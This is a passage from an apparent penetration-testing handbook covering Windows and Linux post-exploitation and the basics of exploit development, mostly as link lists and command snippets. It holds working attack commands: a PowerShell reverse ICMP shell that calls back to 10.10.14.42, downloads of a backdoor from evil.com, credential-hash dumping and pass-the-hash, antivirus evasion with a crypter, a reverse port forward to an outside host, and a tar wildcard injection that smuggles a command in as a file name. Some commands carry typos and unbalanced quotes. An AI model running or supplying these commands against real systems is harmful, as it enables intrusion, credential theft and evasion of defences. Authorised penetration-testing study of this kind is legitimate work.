C:\> powershell -Command '$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $True;$packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send("10.10.14.42", 500, $packet, $options);'



> ###### Reverse ICMP shell

Kali> sudo bash -c "echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET

C:\> powershell -nop -Command "$IP = '10.10.14.42';$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $true;$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes('pie'), $options);while($true){$comms = $client.Send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes(''), $options);if($comms.Buffer){ $cmd = ([Text.Encoding]::ASCII).GetString($comms.Buffer);$reply = (Invoke-Expression -Command $cmd | Out-String);$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes($reply), $options);}}"



##### Services

[Windows Privilege Escalation via weak Service Permissions](http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/)

[The Art of Becoming TrustedInstaller](https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html)

##### LDAP

[5 Ways to find Systems running domain admin processes](https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/)

[I hunt SysAdmins part 1](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)

[I hunt SysAdmins part 2](https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)

[PenTesting Active Directory Environments: CrapMapExec](https://n0where.net/pentesting-active-directory/)

[Active Directory Privilege Relationships: BloodHound](https://n0where.net/active-directory-privilege-relationships-bloodhound/)

[Active Directory Architecture - MSDN](https://msdn.microsoft.com/en-us/library/bb727030.aspx)

[A Week of Evading Microsoft ATA Day 1](http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html)

[Dumping a domains worth of passwords with mimikatz part 2](http://www.harmj0y.net/blog/powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/)

[Attack Methods for gaining Domain Admin](https://hackingandsecurity.blogspot.com/2017/07/attack-methods-for-gaining-domain-admin.html?view=timeslide)

[Find AD users with empty passwords](https://4sysops.com/archives/find-ad-users-with-empty-password-passwd_notreqd-flag-using-powershell/)

[Domain Trusts and why you should care](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)

[A PenTester's guide to group scoping](http://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/)

[How to own any Windows network with group policy hijacking attacks](https://labs.mwrinfosecurity.com/blog/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/)

##### Kerberos

[The Secret Life of Krbtgt](https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf)

[Kerberos Golden Ticket Protection](https://cert.europa.eu/static/WhitePapers/UPDATED - CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)

[Kerberos Golden Ticket Final](http://cybersecology.com/wp-content/uploads/2016/05/Golden_Ticket-v1.13-Final.pdf)

[Et Tu Kerberos](https://www.youtube.com/watch?v=RIRQQCM4wz8)

[Abusing Microsoft Kerberos](https://www.youtube.com/watch?v=lJQn06QLwEw)

[How to pass the ticket through SSH tunnels](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)

[From Pass the Hash to Pass the Ticket with no pain](http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/)

[Abusing Token Privileges for LPE](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)

##### Dump Hashes

[Dump windows password hashes efficiently part 1](http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)

[I'll get your credentials... Later! - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/18.html)

[Grab the Windows Secrets! - Decoder's Blog](https://decoder.cloud/2017/02/11/grab-the-windows-secrets/)

C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump



##### WCE

C:\> wce -w



##### PSExec

You need to be an admin already it copies an executable to an admin share and registers a service and starts it

[SysInternals PSExec - TechNet](https://technet.microsoft.com/en-us/sysinternals/psexec.aspx)

[PUPY](https://github.com/n1nj4sec/pupy)

[WinEXE](https://sourceforge.net/projects/winexe/)

[PSExec Pass the Hash](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)

[Lateral Movement with Invoke-PsExec](http://www.powershellempire.com/?page_id=523)

##### UAC

[UACME](https://github.com/hfiref0x/UACME)

[Anatomy of UAC Attacks - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/27.html)

##### WMIC

[WMIExec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py)

##### Insecure File Permissions

[Elevating privileges by exploiting weak folder permissions](https://www.greyhathacker.net/?p=738)

C:\> icacls example.exe



##### Insecure SYSVOL

C:\> net use z: \\dc01\SYSVOL
Z:\> dir /s Groups.xml
Z:\> copy
Kali> gpp-decrypt



##### RDP

[RDP Hijacking: How to hijack RDS and RemoteApp sessions transparently to move through an organization](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)

##### DLL Injection

[Windows DLL Injection Basics](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html)

[Portable Execution Injection](http://www.malwaretech.com/2013/11/portable-executable-injection-for.html)

[Automated DLL Enumeration](https://github.com/sensepost/rattler)

[Automated DLL Injection](https://github.com/fdiskyou/injectAllTheThings/)

##### NTLM/v2

[Practical guide to NTLM Relaying in 2017 AKA Getting a foothold in under 5 minutes](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

[SMB Relay demystified and NTLMv2 Pwnage with Python](https://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)

##### Token Stealing

Once you have admin access on a computer, you can use the tokens of the other users to access resources in the domain.

##### Passing the Hash

Kali> export SMBHASH="HASH"
Kali> pth-winexe -U administrator //$TARGET cmd



[Pass the Hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

##### runas

[Invoke-Runas](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps)

[Runas Reference](https://ss64.com/nt/runas.html)

##### Encapsulating SSH Traffic with httptunnel

# Bypass Notify with administrative account
$secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force
$mycreds = New-Object System.Management.Automtion.PSCredential("Administrator", $secpasswd)
$computer = "DEV01"
powershell -ExecutionPolicy Bypass -File c:\Windows\temp\run.ps1

# add ruleset for firewall
C:\> netsh advfirewall firewall add rule name ="httptunnel_client" dir=in action=allow program="httptunnel_client.exe enable=yes
C:\> netsh advfirewall firewall add rule name ="3000" dir=in action=allow protocol=TCP localport=3000
C:\> netsh advfirewall firewall add rule name="1080 dir=in action=allow protocol=TCP localport=1080
C:\> netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079
C:\> httptunnel_client.exe

# upload /usr/share/windows-binaries/plink.exe then setup port forward
C:\> plink -l root -pw pass -R 3389:127.0.0.1:3389 208.68.234.99 -P 3000

# Bypass Anti-virus
Kali> cp payload.exe newpayload.exe
Kali> cp /usr/share/windows-binaries/Hyperion-1.0.zip .
Kali> i586-mingw32msvc-g++ Src/Crypter/*.cpp -o hyperion.exe
Kali> wine hyperion.exe ../newpayload.exe ../crypted.exe



[SigThief](https://github.com/secretsquirrel/SigThief)

# Chapter 5 - Linux Post-Exploitation

> _Unplug the network cable and instantiate draconian measures for physical security, You’ll make sure nobody can get in, but you’ll also make sure that nobody actually wants to use the platform. And that may sound like an extreme case, but it’s a very fundamental issue in security. You cannot look at security as something separate. Security issues are ‘just’ normal bugs_
>
> _**— **_**Linus Torvald**

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[The Linux Programming Interface](https://moodle2.units.it/pluginfile.php/115306/mod_resource/content/1/The Linux Programming Interface-Michael Kerrisk.pdf)

[DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

[kernel-exploits - GitHub](https://github.com/xairy/kernel-exploits)

[Linux Kernel Exploits - GitHub](https://github.com/SecWiki/linux-kernel-exploits)

[Basic Linux Privilege Escalation - g0tm1lk](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[UNIX PrivEsc Check](https://github.com/pentestmonkey/unix-privesc-check)

[LinEnum](https://github.com/rebootuser/LinEnum)

[linuxprivchecker.py](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123)

[Linux PrivEsc for fun and profit and all around mischief](https://www.youtube.com/watch?v=dk2wsyFiosg)

[A PenTester's Guide to Pivoting](http://hackingandsecurity.blogspot.com/2017/10/a-red-teamers-guide-to-pivoting.html)

[Understanding systemd](https://n0where.net/understanding-systemd/)

##### Listing Packages

Kali> dpkg -l
Kali> rpm -qa



##### Uploading Files

Kali> wget http://evil.com/backdoor.py
Kali> curl http://evil.com/backdoor.py
Kali> scp ~/backdoor.py user@$TARGET:tmp/backdoor.py



##### Port Redirection

> ###### rinetd

rinetd

vi /etc/rinetd.conf
# bind        # port        # connect        # port
a.b.c.d     53             e.f.g.h         80



##### SSH

> ###### Generate key

Kali> ssh-keygen -t rsa



> ###### SSH with Key

Kali> ssh -i key_file user@host



> ###### SSH Tunneling

# Local Tunnel
Kali> ssh $ATTACKER -L 3000:$TARGET:2222

# Remote Tunnel
Kali> ssh $TARGET -R 2222:localhost:3000

# Dynamic Tunnel to $TARGET
Kali> ssh -D 127.0.0.1:3000 -N username@$TARGET



> ###### tgcd tunneling

Kali> tgcd -L -p 9999 -q 40000
Kali> tgcd -C -s IP:9999 -c ATTACKER:40000
Kali> iptables -t nat -A OUTPUT -d IP -j DNAT --to-destination 127.0.0.1



##### HTTP Tunneling

Kali> nc -vvn $TARGET 8888
CONNECT $TARGET2:80 HTTP/1.0



##### Proxychains

# create reverse ssh tunnel on our target
Kali> ssh -f -N -R 2222:127.0.0.1:22 root@$ATTACKER

# create on our attacking machine
Kali> ssh -f -N -D 127.0.0.1:8080 -p 2222

# Good to go
Kali> proxychains nmap -sV $TARGET



##### Networking

# Set IP

Kali> ifconfig eth0 xxx.xxx.xxx.xxx/24


# Calculate subnet

Kali> ipcalc xxx.xxx.xxx.xxx/24


# Bring devices up/down

Kali> ifconfig eth0 up
Kali> ifconfig eth0 down


# Get IP from DHCP

Kali> dhclient


# Log traffic for ICMP packets

Kali> tcpdump -i tun0 icmp


# Test from remote box

Kali> ping $ATTACKER -c 3



##### Listen for Shell

> ###### Resources

[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

> ###### TCP

Kali> nc -vlnp 54321



> ###### UDP

    Kali> socat file:tty,echo=0,raw udp-listen:54321

##### Start a simple HTTP server

Kali> python -m SimpleHTTPServer 80
Kali> python3 -m http.server
Kali> ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
Kali> php -S 0.0.0.0:80



##### Bash Foo

> ###### bin2shellcode

function bin2sc {
    hexdump -v -e '"\\""x" 1/1 "%02x" ""'${1}
}



> ###### Scan for string in all files in a directory

Kali> du . | awk '{print $2}'| grep -rnw "string" --color



> ###### Convert file contents to lowercase

Kali> tr '[:upper:]' '[:lower:]'< inputfile



> ###### Simple for loop

    Kali> for i inseq 10 20;do this;done

> ###### Remove last byte from a file

Kali> truncate -s -1 filename



> ###### Hijack full path to a binary for current pts

Kali> function/usr/bin/foo () { /usr/bin/echo "It works"; }
Kali> export -f /usr/bin/foo



> ###### Use Env to force scripts to run a different command

Kali> ln -s /usr/bin/nano cat
Kali> export PATH=.:$PATH



##### Port Knocking

Kali> for x in port1 port2 port3;do nmap -Pn --host_timeout 201 --max-retries -p $x $TARGET;done
Kali> nc -z $TARGET port1 port2 port3;



##### Breakout Shell

> ###### Resources

[Escape from Shellcatraz: Breaking out of restricted UNIX shells](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)

Kali> awk ‘BEGIN {system(“/bin/bash”)}’
Kali> python -c ‘import pty; pty.spawn(“/bin/bash”)’
Kali> echo os.system(‘/bin/bash’);
Kali> /bin/sh -i



##### Upgrade Shell

> ###### Netcat

# Background current shell: CTRL + Z

Kali> stty raw -echo
Kali> fg



> ###### Resources

[Upgrading Simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

##### Insecure Sudo

Kali> sudo -l



##### Finding gems on the file system

# Find commands for SUID or SGID
Kali> find / -perm -g=s -type f 2>/dev/null
Kali> find / -perm -u=s -type f 2>/dev/null

# Find commands for writable/executable directories
Kali> find / -writable -type d 2>/dev/null
Kali> find / -perm -o w -type d 2>/dev/null
Kali> find / -perm -o x -type d 2>/dev/null

# Sometimes a quick bit of information can be helpful
# Especially if you get access denied when you try to run a command
# Such as iptables -L
Kali> locate iptables

# Locate useful files like gcc, wget, etc
Kali> locate gcc

# Take advantage of wildcard searching
# This is only a base example of what you can do
# I use this technique often to find random things hidden deep in the file system
Kali> ls /*/*/*/*.conf

# Be creative
Kali> cat /etc/cron.*/* | grep SEARCHSTRING

# Mix it up
Kali> find / -type f -name '*.conf' | xargs grep -rnw -3 "Password" 2>/dev/null



##### Unmounted drives

Kali> cat /etc/fstab
Kali> mount



##### Exim

Kali> exim -bV -v | grep -i Perl



##### Wildcard Manipulation

> ###### Resources

[UNIX Wildcards gone wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

> ###### Sudoedit

# if sudoedit is using wildcards you can escape out with a few techniques
# Such as:  (root) NOPASSWD: sudoedit /var/www/*/*/file.html
Kali> ln -s /root/.ssh/authorized_keys /var/www/testing/testdir/file.html
# Now when you add your key to this file, you will be able to login to root, for example



> ###### Tar

# If there is a script running as an authorized user that uses wildcards to tar a folder, you can inject command line arguments via:
Kali> echo '' > "--checkpoint-action=exec='sh shell.sh'"
Kali> echo '' > "--checkpoint=1"





# Chapter 6 - Exploit Development

> _Security risks at the application level are among the most significant, pervasive categories of security problems impacting organizations today. But traditional IT security focuses on network and perimeter-based protection, not on the application code itself.And while most development teams test their applications for functionality, performance, and integration, the lack of security testing early in the development process can have serious consequences. Failure to address security throughout the application lifecycle can result in embarrassment—or catastrophic damages like the loss of intellectual property, money, or data._
>
> _**— **_**Buffer Overflow Attacks: Detect, Exploit, Prevent, page 403**

## Resources

##### Understanding programs in memory

[Anatomy of a program in memory](http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/)

[Journey to the stack](http://duartes.org/gustavo/blog/post/journey-to-the-stack/)

[Epilogue: Canaries and Buffer Overflows](http://duartes.org/gustavo/blog/post/epilogues-canaries-buffer-overflows/)

##### Intro to Assembly

[Writing ARM Assembly Part 1](https://azeria-labs.com/writing-arm-assembly-part-1/)

[Assembly - SkullSecurity](https://wiki.skullsecurity.org/index.php?title=Fundamentals)

[x86 Assembly Crash Course](https://www.youtube.com/watch?v=75gBFiFtAb8)

[Assembly Language MegaPrimer for Linux](http://www.securitytube.net/groups?operation=view&groupId=5)

##### Intro to Buffer Overflows

[Intro to Buffer Overflows - Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo)

[Getting cozy with Exploit Development](https://blog.mallardlabs.com/getting-cozy-with-exploit-development/)

##### Courses

[Course materials for Modern Binary Exploitation by RPISEC](https://github.com/RPISEC/MBE)

##### Resources

[From Buffer Overflows to “Weird Machines” and Theory of Computation](http://langsec.org/papers/Bratus.pdf)

[Breaking the x86 Instruction Set](https://www.youtube.com/watch?v=KrksBdWcZgQ)

[LiveOverflow's YouTube Channel](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)

[radare2 as an alternative to gdb-peda](https://monosource.github.io/2016/10/radare2-peda)

[Trampolines in x64](http://www.ragestorm.net/blogs/?p=107)

[Exploit Mitigation Kill Chain](http://0xdabbad00.com/wp-content/uploads/2013/04/exploit_mitigation_kill_chain.pdf)

[Stack Smashing Protector](http://wiki.osdev.org/Stack_Smashing_Protector)

[Unusual Bugs](https://www.youtube.com/watch?v=qj79Qdmw0Pk)

[Exploit tips & techniques](https://www.youtube.com/watch?v=FEXnJKXYoLM)

[Differential Slicing: Identifying Casual Execution Differences](http://bitblaze.cs.berkeley.edu/papers/diffslicing_oakland11.pdf)

[Shellcoding for Linux & Windows Tutorial](http://www.vividmachines.com/shellcode/shellcode.html)

[Writing Shellcode by Hand](https://www.exploit-db.com/docs/17065.pdf)

[Understanding JIT Spraying](http://blog.cdleary.com/2011/08/understanding-jit-spray/)

[Interpreter Exploitation: Pointer inference and JIT spraying](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf)

[Writing JIT-Spray Shellcode for fun and profit](https://dl.packetstormsecurity.net/papers/shellcode/Writing-JIT-Spray-Shellcode.pdf)

[Bypassing memory protections: the future of exploitation](https://www.usenix.org/legacy/events/sec09/tech/slides/sotirov.pdf)

##### Intel

> ###### Registers

EAX - Accumulator
    Holds return value usually
EBX - Accumulator
    Base Calculations (Arrays, Pointers into Arrays of objects)
ECX - Count / Accumulator
EDX - Data I/O Pointer
ESI - Source index
    for source of string / array operands
EDI - Destination index
    for dest of string / array opperands
EIP - Instruction Pointer
    Points to next instruction
ESP - Stack Pointer
    Points to the top of the stack
EBP - Stack Base Pointer
    Points to the base of the stack



> ###### Instructions

mov - define
jmp - jump to address
call - jump to address and push exec address to stack
ret - pop the first value off stack and jumps to it
push - decrements stack pointer and saves new operand
pop - sets the operand to the value of the stack, then increments



## Buffer Overflows

##### Setup & Information

> ###### Check ASLR/DEP

###### Linux

Kali> checksec filename



###### Windows

C:\> Get-PESecurity -file "filename"



[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

> ###### Disable/Enable ASLR/DEP

###### Linux

Kali> echo 0 > /proc/sys/kernel/randomize_va_space
Kali> echo 2 > /proc/sys/kernel/randomize_va_space



###### Windows

[The Enhanced Mitigation Experience Toolkit](https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit)

[Disable ASLR](http://icompile.eladkarako.com/disable-aslr/)

> ###### See what shared libs a program uses

###### Linux

Kali> ldd filename



> ###### Find hex addresses of functions/libs within a program

###### Linux

Kali> readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
Kali> strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh



##### Attack Vectors

> ###### Integer-based

[Socket Programming in Python and Integer Overflow](https://www.youtube.com/watch?v=d6BU8DWxb3c)

> ###### Stack-based

Overflow input to overwrite EIP with return address that leads to payload

[Intro to Buffer Overflows - ch3rn0byl](http://ch3rn0byl.com/intro-to-buffer-overflows/)

[Beginning Stack Based Buffer Overflows - The Grey Corner](http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html)

[Exploit Writing Tutorial Part 1 Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

[Smash Stack Revived](https://avicoder.me/2016/02/01/smashsatck-revived/)

[Smashing the Stack for Fun & Profit : Revived](https://avicoder.me/papers/pdf/smashthestack.pdf)

[Are Buffer Overflows on a modern system impossible?](https://www.youtube.com/watch?v=4HxUmbOcN6Y)

[Identifying another exploit mitigation and finding a bypass](https://www.youtube.com/watch?v=MMm0I2Dj51A)

[Brute-force 32bit stack cookie](https://www.youtube.com/watch?v=KGzHcqJV-QM)

[Exploiting SLMail](http://www.whitelist1.com/2016/11/xstack-overflow-1-exploiting-slmail.html)

[Introduction to Exploit Development - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/expDev/1.html)

[Introduction to Linux Exploit Development - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/expDev/9.html)

[Windows Buffer Overflow Tutorial: Dealing with Character Translation - The Grey Corner](http://www.thegreycorner.com/2010/01/windows-buffer-overflow-tutorial.html)

> ###### SEH-based

Overflow input to overwrite SEH -&gt; next SEH -&gt; Pop pop ret

[SEH Stack based buffer overflows - The Grey Corner](http://www.thegreycorner.com/2010/01/seh-stack-based-windows-buffer-overflow.html)

[Stacks & Handlers & Python, oh my! - ch3rn0byl](http://ch3rn0byl.com/stacks-and-handlers-and-python/)

[Exploit Tutorial: Buffer Overflow – SEH Bypass](http://www.primalsecurity.net/0x3-exploit-tutorial-buffer-overflow-seh-bypass/)

> ###### Heap-based

Overflow input to overwrite heap with dummy data, 2nd chunk overwrite forward link with destination and backwards link with value

[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/introduction.html)

[Heap Exploitation - GitHub](https://github.com/DhavalKapil/heap-exploitation)

[Heap Spraying Exploit Tutorial](http://www.thegreycorner.com/2010/01/heap-spray-exploit-tutorial-internet.html)

[Exploit Writing Tutorial Heap Spraying Demystified - corelan](https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/)

[Walking the heap using pydbg](http://www.debasish.in/2015/02/walking-heap-using-pydbg.html)

[Tracking down heap overflows with RR](https://sean.heelan.io/2016/05/31/tracking-down-heap-overflows-with-rr/)

[The Heap: What does malloc\(\) do?](https://www.youtube.com/watch?v=HPDBOhiKaD8)

[The Heap: How to exploit a Heap Overflow](https://www.youtube.com/watch?v=TfJrU95q1J4)

[how2heap - GitHub](https://github.com/shellphish/how2heap)

[Heap Overflows for Humans 101](http://www.fuzzysecurity.com/tutorials/mr_me/2.html)

> ###### Double-free

Memory freed twice. corrupts heap memory manager.

1\) chunk must be isolated \( no freed adjacent chunks \)

2\) destination free list bin must be empty

Forward/Backward pointers both point to base of heap, and the heap points back to the node \(self referential\) infinite loop. \(unlink fails\)

deprecated but still works with some creativity

If heap falls into this state you may be able to use after free or another buffer overflow.

[The Heap: How do use-after-free exploits work?](https://www.youtube.com/watch?v=ZHghwsTRyzQ)

[The Heap: Once upon a free\(\)](https://www.youtube.com/watch?v=gL45bjQvZSU)

[The Heap: dlmalloc unlink\(\) exploit](https://www.youtube.com/watch?v=HWhzH--89UQ)

[Exploring pwnable with ltrace and gdbinit script - Exploitation part 1/2](https://www.youtube.com/watch?v=sJPhsE_XeKI)

[Use-after-free and overwrite entry in GOT - Exploitation part 2/2](https://www.youtube.com/watch?v=ANIoQXAoyr0)

> ###### Memory Corruption

Using memory corruption to leak sensitive data Fuzz the inputs and observe all possible changes in the program Note any oddities and changes \(Especially a dump of bytes! ;\)\)

[Blind Buffer Overflow exploitation to leak secret data](https://www.youtube.com/watch?v=SstD1O4_kwc)

> ###### Return to libc

[libc database - GitHub](https://github.com/niklasb/libc-database)

[Return-to-libc](https://www.exploit-db.com/docs/28553.pdf)

[Doing ret2libc with a Buffer Overflow because of restricted return pointer](https://www.youtube.com/watch?v=m17mV24TgwY)

[BUFFER OVERFLOW PRIMER PART 8 \(RETURN TO LIBC THEORY\)](http://www.securitytube.net/video/257)

[The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls \(on the x86\)](http://hovav.net/dist/geometry.pdf)

[Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)

[Cheating the ELF](http://www.cs.dartmouth.edu/~sergey/cs108/2010/subversiveld.pdf)

[PLT and GOT - the key to code sharing and dynamic libraries](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)

> ###### Bitflip

[Rowhammer Attacks: An Extended Walkthrough Guide](https://gruss.cc/files/sba.pdf)

[Exploiting the DRAM rowhammer bug to gain kernel privileges](https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)

[flipfloyd - GitHub](https://github.com/IAIK/flipfloyd)

> ###### SIGRETURN Oriented Programming

[Sigreturn Oriented Programming is a real Threat](https://subs.emis.de/LNI/Proceedings/Proceedings259/2077.pdf)

> ###### Jump Oriented Programming

[Jump-Oriented Programming: A New Class of Code-Reuse Attack](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf)

> ###### Return Oriented Programming

[64-bit Linux Return-Oriented Programming](https://crypto.stanford.edu/~blynn/rop/)

[Return Oriented Exploitation \(ROP\)](https://www.youtube.com/watch?v=5FJxC59hMRY)

[An introduction to the Return Oriented Programming and ROP chain generation](http://shell-storm.org/talks/ROP_course_lecture_jonathan_salwan_2014.pdf)

[Return-Oriented-Programming \(ROP FTW\)](https://www.exploit-db.com/docs/28479.pdf)

[DEP & ROP: Modern Binary Exploitation](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/11/07_lecture.pdf)

[ROP is Still Dangerous: Breaking Modern Defenses](http://nicholas.carlini.com/papers/2014_usenix_ropattacks.pdf)

[Return oriented programming - Wikipedia](https://en.wikipedia.org/wiki/Return-oriented_programming)

[Introduction to return oriented programming \(ROP\)](https://www.youtube.com/watch?v=yS9pGmY_xuo)

[The need for a POP POP RET instruction sequence](https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/)

[Intro to ROP: ROP Emporium — Split](https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08)

[ROP Emporium](https://ropemporium.com)

[OptiROP: hunting for ROP gadgets in style](https://www.youtube.com/watch?v=_3uBybBpq48)

[Introduction to return oriented programming \(ROP\)](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)

[SROP \| Signals, you say?](https://0x00sec.org/t/srop-signals-you-say/2890)

[Return-Oriented Programming without Returns](https://www.cs.uic.edu/~s/papers/noret_ccs2010/noret_ccs2010.pdf)

[Blind Return Oriented Programming \(BROP\)](http://www.scs.stanford.edu/~sorbo/brop/)

> ###### EggHunting

The art of searching memory

[EggHunting Sorcery - ch3rn0byl](http://ch3rn0byl.com/egghunting-sorcery/)

[Windows Buffer Overflow Tutorial: An Egghunter and a Conditional Jump](http://www.thegreycorner.com/2010/02/windows-buffer-overflow-tutorial.html)

[HackSysTeam - EggHunter](https://www.exploit-db.com/docs/18482.pdf)

##### Security Mechanisms

> ###### Stack Canaries/Cookies

[Buffer Overflow Protections \(Canaries\) - Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries)

[Mitigating Buffer Overflow Attacks with Stack Cookies](https://www.rapid7.com/resources/mitigating-buffer-overflow-attacks-with-stack-cookies/)

[Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)

[Linux GLibC Stack Canary Values](https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/)

[PLAYING WITH CANARIES](https://www.elttam.com.au/blog/playing-with-canaries/)

> ###### NX/DEP

[Executable Space Protection - Wikipedia](https://en.wikipedia.org/wiki/Executable_space_protection)

[Can MPROTECT set the stack itself as executable? - StackExchange](https://reverseengineering.stackexchange.com/questions/9336/can-mprotect-set-the-stack-itself-as-executable)

> ###### ASLR

[ASLR - Wikipedia](https://en.wikipedia.org/wiki/Address_space_layout_randomization)

[Exploit Dev 101: Bypassing ASLR on Windows](http://www.abatchy.com/2017/06/exploit-dev-101-bypassing-aslr-on.html)

[Simple ASLR/NX bypass on a Linux 32 bit binary - Decoder's Blog](https://decoder.cloud/2017/06/15/simple-aslrnx-bypass-on-a-linux-32-bit-binary/)

[Linux ASLR integer overflow: Reducing stack entropy by four](http://hmarco.org/bugs/linux-ASLR-integer-overflow.html)

[Bypassing ASLR by predicting a process’ randomization](https://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Bypassing-aslr-whitepaper.pdf)

## Information Disclosure

##### Format Strings

> ###### Resources

%d, %i - signed decimal
%u - unsigned decimal
%o - unsigned octal
%x - unsigned hexadecimal int
%X - unsigned hexadecimal int (UPPERCASE)
%f - decimal float
%e - scientific notation
%a - hexadecimal floating point
%c - char
%s - string
%p - pointer address
%n - writes bytes to memory address

will pop off stack until all are satisfied or segfault

# printf
prints values on the stack in hex
printed in human friendly in little-endian
view arbitrary memory locations
move argument pointer far enough forward to point within the string (%x chain)
printf("\xd3\x4d\xb3\x3f%x%x%x%x%s")
dereferences so you get string form

printf("hello%n\n", (int *)&i); // write 5 to i
printf("\xd3\x4d\xb3\x3f%x%x%x%150x%n"); // write 150 to it



[Remote format string exploit in syslog\(\)](https://www.youtube.com/watch?v=MBz5C9Wa6KM)

[Format String to dump binary and gain RCE](https://www.youtube.com/watch?v=XuzuFUGuQv0)

[Format String Exploit and overwrite the Global Offset Table](https://www.youtube.com/watch?v=t1LH9D5cuK4)

[Format string exploit on an arduino](https://www.youtube.com/watch?v=fRgNtGXDMlY)

[A simple Format String exploit example](https://www.youtube.com/watch?v=0WvrSfcdq1I)

[From Format String Vulnerability to Remote Code Execution](https://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/)

[Format String Exploitation-Tutorial](https://www.exploit-db.com/docs/28476.pdf)

[Fun with Info-Leaks](https://rh0dev.github.io/blog/2015/fun-with-info-leaks/)

## Deserialization

##### PHP

> ###### Resources

[Exploiting PHP7 unserialize](https://www.youtube.com/watch?v=_Zj0B4D4TYc)

[Remote code execution via PHP \[Unserialize\]](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)

##### Java

> ###### Resources

